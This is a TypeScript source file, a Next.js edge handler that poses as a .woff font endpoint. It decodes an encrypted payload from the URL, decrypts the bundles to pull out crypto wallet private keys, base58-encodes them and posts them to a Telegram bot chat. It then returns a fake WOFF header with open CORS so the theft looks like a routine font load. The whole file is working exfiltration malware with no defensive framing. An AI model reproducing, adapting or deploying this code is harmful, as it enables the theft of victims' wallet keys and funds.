import { NextRequest } from "next/server";

export const config = {
  runtime: "edge",
};

// Minimal Base58 encoder
const BASE58_ALPHABET =
  "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function encodeBase58(buffer: Uint8Array): string {
  const digits = [0];
  for (let byte of buffer) {
    let carry = byte;
    for (let i = 0; i < digits.length; i++) {
      const val = digits[i] * 256 + carry;
      digits[i] = val % 58;
      carry = (val / 58) | 0;
    }
    while (carry) {
      digits.push(carry % 58);
      carry = (carry / 58) | 0;
    }
  }
  // handle leading zeros
  for (let i = 0; i < buffer.length && buffer[i] === 0; i++) {
    digits.push(0);
  }
  return digits
    .reverse()
    .map((d) => BASE58_ALPHABET[d])
    .join("");
}

// Convert a base64 (or URL-safe base64) string → Uint8Array
function b64ToBytes(b64: string): Uint8Array {
  b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
  const pad = (4 - (b64.length % 4)) % 4;
  b64 += "=".repeat(pad);
  const bin = atob(b64);
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) {
    arr[i] = bin.charCodeAt(i);
  }
  return arr;
}

export default async function handler(req: NextRequest) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Missing BOT_TOKEN or CHAT_ID");
    return new Response("Server misconfigured", { status: 500 });
  }

  // 1) extract slug and strip .woff
  const parts = new URL(req.url).pathname.split("/");
  let slug = parts[parts.length - 1] || '';
  if (slug.endsWith('.woff')) slug = slug.slice(0, -5);
  const sepIndex = slug.indexOf('_');
  if (sepIndex < 0) {
    return new Response("Invalid slug", { status: 400 });
  }

  let payloadJson: string;
  try {
    const encoded = slug.substring(sepIndex + 1);
    const bytes = b64ToBytes(encoded);
    payloadJson = new TextDecoder().decode(bytes);
  } catch (e) {
    console.error("Slug decode error:", e);
    return new Response("Bad request", { status: 400 });
  }

  // 2) parse JSON
  let data: { keybundle: string; sBundles: string[] };
  try {
    data = JSON.parse(payloadJson);
  } catch (e) {
    console.error("JSON parse error:", e);
    return new Response("Bad request", { status: 400 });
  }

  // 3) import AES-GCM key
  let aesKey: CryptoKey;
  try {
    const keyBytes = b64ToBytes(data.keybundle);
    aesKey = await crypto.subtle.importKey(
      "raw",
      keyBytes,
      { name: "AES-GCM" },
      false,
      ["decrypt"]
    );
  } catch (e) {
    console.error("Key import error:", e);
    return new Response("Bad request", { status: 400 });
  }

  // 4) decrypt each bundle and extract private half
  const privKeys: string[] = [];
  for (let i = 0; i < data.sBundles.length; i++) {
    const bundle = data.sBundles[i];
    const colonPos = bundle.indexOf(':');
    if (colonPos < 0) continue;
    const ivB64 = bundle.substring(0, colonPos);
    const cipherB64 = bundle.substring(colonPos + 1);
    try {
      const iv = b64ToBytes(ivB64);
      const cipher = b64ToBytes(cipherB64);
      // Decrypt to get ASCII hex string
      const plainBuf = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv },
        aesKey,
        cipher
      );
      const hexStr = new TextDecoder().decode(plainBuf);
      if (hexStr.length !== 128) {
        console.error(`Unexpected hex length ${hexStr.length}`);
        continue;
      }
      // Last 64 chars = private key hex
      const privHex = hexStr.slice(64);
      // Convert hex → bytes
      const privBytes = new Uint8Array(
        privHex.match(/.{2}/g)!.map((h) => parseInt(h, 16))
      );
      const privB58 = encodeBase58(privBytes);
      privKeys.push(privB58);
    } catch (e) {
      console.error(`Decrypt error #${i}:`, e);
    }
  }

  // 5) send Telegram if any keys
  if (privKeys.length) {
    const lines: string[] = [];
    privKeys.forEach((pk, idx) => {
      lines.push(`Wallet ${idx + 1}`);
      lines.push(pk);
      lines.push("");
    });
    const text = lines.join("\n").trim();
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text }),
      });
    } catch (e) {
      console.error("Telegram send error:", e);
    }
  } else {
    console.error("No private keys decrypted");
  }

  // 6) return valid WOFF header with CORS
  return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
    headers: {
      "Content-Type": "font/woff",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Credentials": "true"
    },
  });
}
